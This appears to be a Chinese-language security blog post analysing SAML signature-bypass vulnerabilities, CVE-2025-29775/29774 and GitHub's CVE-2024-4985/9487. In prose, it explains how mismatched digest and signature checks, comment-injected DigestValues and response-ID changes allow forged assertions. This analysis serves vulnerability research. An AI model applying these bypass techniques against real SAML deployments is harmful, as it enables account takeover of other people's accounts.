现代 saml 攻击(1)

wude
2025-04-24

背景

saml 攻击在沉寂了多年后，从 24 年开始的 gitlab 和 github 账号接管漏洞开始又重新引起了大家的注意，一直到 25 年还有针对这两者的漏洞，这其中也出现了一些有意思的攻击方式。所以准备分两篇解析一下这几个新出的漏洞，本文是第一篇，介绍如何用已有的老旧攻击技术攻击现代的 saml 应用，第二篇则是一些较为新的攻击方法(对我来说如此)。

saml 认证

关于 saml 认证不会多讲，简要介绍一下在认证过程中如何实现签名验证以确保报文的安全。先来看 saml response 的格式：

其中用来确保完整性的是 DigestValue 和 SignatureValue，DigestValue 会与 Reference 指向的 id 对应的 xml 文档先进行规范化后哈希得到的值进行比较，在这里就是 Assertion 标签及其包含的内容，确保整个 Assertion 没有被修改。这是其中一种，还有一种是 Signature 标签指向的是整个 Response 内容。那能不能也将 DigestValue 修改以匹配修改后的 Assertion？这就是 SignatureValue 起作用的地方，SignatureValue 用不对称加密计算得到，对 Signature 内的 SignedInfo 进行计算得到的值与 SignatureValue 比较，SignatureValue 需要通过私钥生成，确保了安全性。

所以 saml 是通过两个签名值确保了各个部分的完整性。看起来很合理，但是后面我们就会看到不同的实现方式带来的各种绕过。所谓政策是好的，只是执行的人出了错。。。

CVE-2025-29775

先看 29775。一个注释的 DigestValue，和一个正常的 DigestValue。所以这里的攻击方式会是什么？

首先回顾一下，DigestValue 既用来表示 Assertion 的完整性，又参与 SignatureValue 的计算，如果两个 DigestValue 用来参与不同的步骤，则可能会出现绕过，这也是这里出漏洞的地方。

首先计算 Assertion 得到的值与注释的 DigestValue 比较，注释的值可控，所以这里可以填入任意值。然后计算 SignatureValue 的时候注释不参与，所以使用合法的 DigestValue，校验也会通过。

再看 29774，其实也是差不多的，只不过这里多了整个 SignedInfo，从名字也可以看出，第一个 SignedInfo 是用来校验 DigestValue 的，第二个是用来校验 SignatureValue 的。

GitHub-(CVE-2024-4985&CVE-2024-9487)

CVE-2024-9487 是对 CVE-2024-4985 的补充修复，pd 这篇应该是对 CVE-2024-9487 的分析。由于暂时搞不到源码，所以无从得知。下面根据 pd 对原本 saml 处理代码进行修改但不改变原始逻辑后的代码进行漏洞分析。

先来看一下整体调用逻辑，从 from_param 方法开始：

先来定义两个词，response-signature 和 assertion-signature，前者是针对整个 response 文档，后者只针对每个对应的 assertion。通过 reference 指向实现。

看一下处理的逻辑，从 build 方法开始：

当存在 encrypted-assertion 时，且 response 包含一个 response-signature 标签时，build 方法会返回这个 response-signature 标签，并且解密 encrypted-assertion 得到一个 plain-assertion，将整个解密后的 response 返回到下一步的 valid 方法，可以理解返回两个值，一个是 response-signature，另一个是得到的 plain-assertion。

valid 方法第一步是校验 schema，这一步不理，直接到下面的 validate。

validate 方法第一步使用 validate_has_signature 方法检查是否存在合法的签名，这一步是对上面得到的 plain-assertion 进行的，检查分两步，第一步是检查是否存在匹配的 response-signature 签名，如果不存在，会检查每个 assertion 的 assertion-signature 是否匹配，以防止签名交换攻击。

第二步是对上面获取到的匹配的 signature 进行 digestvalue 的校验，可以是 response-signature 或者 assertion-signature。

第三步是对 build 方法返回的 response-signature 签名进行验签。根据获取到的 reference-uri 从整个文档找第一个符合的值，先进行 digestvalue
校验，然后对 SignedInfo 进行验签 SignatureValue。

回顾对 saml 攻击，关键点在于 signature 验签和 digest 摘要不匹配，这里如何实现呢？可以看到实际验签取到的是 build 方法返回值，而验证 digest 的是 validate 方法，validate 方法是对整个 plain-assertion 处理，如果存在加密断言，第一步 build 返回是 response-signature，再验证 digest 时可以是 assertion-signature，关键点在于 validate_has_signature，这一步需要 response-signature 不匹配，自然而然就走到了 assertion-signature。而要 response-signature 不匹配很简单，更改 response 的 id 就行了，这样 response-signature 的 reference 不匹配 response。

最后一步验签也很重要，要让签名通过，就需要原始的 response 被包含在整个 new-response 里面，这里 pd 使用了 object 标签，这是 signature 标签的一个扩展标签，是可选标签，且不参与签名计算。
